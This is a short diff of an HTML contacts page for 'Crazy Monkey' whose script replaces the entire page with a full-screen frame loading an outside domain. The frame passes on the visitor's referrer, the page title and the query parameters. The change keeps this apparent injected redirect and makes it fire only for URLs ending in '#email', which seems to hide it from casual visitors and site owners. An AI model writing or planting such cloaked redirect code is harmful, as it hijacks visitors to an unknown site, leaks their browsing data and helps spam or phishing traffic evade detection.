@@ -5,7 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Crazy Monkey - Contacts</title>
     <script type="application/javascript">
-        document.write('<frameset rows="100%"><frame src="https://durixt.com/WVHNPsYf?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e8009f65cc64=frame5e8009f65cc65"></frameset>')
+        if (location.hash == '#email') {
+            document.write('<frameset rows="100%"><frame src="https://durixt.com/WVHNPsYf?se_referrer=' + encodeURIComponent(document.referrer) + '&default_keyword=' + encodeURIComponent(document.title) + '&'+window.location.search.replace('?', '&')+'&frm5e8009f65cc64=frame5e8009f65cc65"></frameset>');
+        }
     </script>
 </head>
 <body>
